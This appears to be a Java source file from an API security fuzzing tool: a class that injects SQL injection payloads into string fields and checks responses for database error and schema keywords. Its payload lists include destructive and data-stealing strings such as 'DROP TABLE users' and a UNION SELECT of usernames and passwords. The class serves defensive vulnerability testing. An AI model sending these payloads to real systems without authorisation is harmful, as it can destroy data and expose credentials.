package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.model.CatsResponse;
import com.endava.cats.model.FuzzingData;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.stream.Collectors;

/**
 * Fuzzer that sends SQL injection payloads in string fields.
 * <p>
 * This fuzzer tests for SQL injection vulnerabilities by sending common SQL injection
 * payloads and analyzing the response for database error messages or other indicators
 * of successful injection.
 * </p>
 */
@Singleton
@FieldFuzzer
public class SqlInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    private static final List<String> TOP_SQL_INJECTION_PAYLOADS = List.of(
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1 OR 1=1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' ORDER BY 1--",
            "'; SELECT SLEEP(5)--"
    );

    private static final List<String> ALL_SQL_INJECTION_PAYLOADS = List.of(
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1 OR 1=1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "'; DROP TABLE users--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT username, password FROM users--",
            "admin'--",
            "admin' #",
            "' OR ''='",
            "' OR 1=1#",
            "') OR ('1'='1",
            "')) OR (('1'='1",
            "' AND '1'='1",
            "' AND 1=1--",
            "1' AND '1'='1",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "' OR 1=1 LIMIT 1--",
            "' ORDER BY 1--",
            "' ORDER BY 10--",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)#"
    );


    /**
     * Creates a new SqlInjectionInStringFieldsFuzzer instance.
     *
     * @param simpleExecutor          the executor used to run the fuzz logic
     * @param testCaseListener        the test case listener for reporting results
     * @param securityFuzzerArguments the security fuzzer arguments
     */
    public SqlInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                            SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "SQL";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_SQL_INJECTION_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_SQL_INJECTION_PAYLOADS;
    }

    @Override
    public String description() {
        return "iterate through each string field and send SQL injection payloads to detect SQL injection vulnerabilities";
    }

    private static final List<String> SQL_ERROR_KEYWORDS = List.of(
            "sql syntax", "syntax error", "unclosed quotation", "unterminated string",
            "unexpected end of sql", "invalid query", "database error", "db error",
            "query failed", "sql error", "warning: mysql", "warning: pg_", "warning: oci_",
            "supplied argument is not a valid", "microsoft sql", "sqlstate"
    );

    private static final List<String> SCHEMA_KEYWORDS = List.of(
            "information_schema", "sys.tables", "syscolumns", "pg_catalog", "pg_class",
            "sqlite_master", "mysql.user", "dual ", "table_schema", "column_name"
    );

    @Override
    protected InjectionDetectionResult detectInjectionEvidence(CatsResponse response, FuzzingData data) {
        String responseBody = response.getBody() != null ? response.getBody().toLowerCase(Locale.ROOT) : "";
        int responseCode = response.getResponseCode();

        List<String> indicators = new ArrayList<>();

        if (hasUnionSelectWithData(responseBody)) {
            indicators.add("UNION SELECT output");
        }

        if (containsSchemaDetails(responseBody)) {
            indicators.add("database schema information");
        }

        if (containsSqlErrorMessage(responseBody) && !indicators.isEmpty()) {
            indicators.add("SQL error response");
        }

        if (indicators.size() >= 2) {
            String evidenceSummary = indicators.stream().collect(Collectors.joining(", "));
            return InjectionDetectionResult.vulnerable(
                    "SQL injection vulnerability detected",
                    "Response shows multiple independent SQL indicators (%s). Response code: %d"
                            .formatted(evidenceSummary, responseCode));
        }

        return InjectionDetectionResult.notVulnerable();
    }

    private boolean hasUnionSelectWithData(String responseBody) {
        boolean hasUnionSelect = responseBody.contains("union") && responseBody.contains("select");
        if (!hasUnionSelect) {
            return false;
        }

        boolean hasFromClause = responseBody.contains(" from ") || responseBody.contains("from ");
        boolean hasSchemaKeyword = containsAny(responseBody, SCHEMA_KEYWORDS);
        boolean hasColumnStructure = responseBody.contains("|") && responseBody.contains("----");

        return (hasFromClause || hasSchemaKeyword || hasColumnStructure);
    }

    private boolean containsSchemaDetails(String responseBody) {
        return containsAny(responseBody, SCHEMA_KEYWORDS);
    }

    private boolean containsSqlErrorMessage(String responseBody) {
        return containsAny(responseBody, SQL_ERROR_KEYWORDS);
    }

    private boolean containsAny(String responseBody, List<String> keywords) {
        for (String keyword : keywords) {
            if (responseBody.contains(keyword)) {
                return true;
            }
        }
        return false;
    }
}
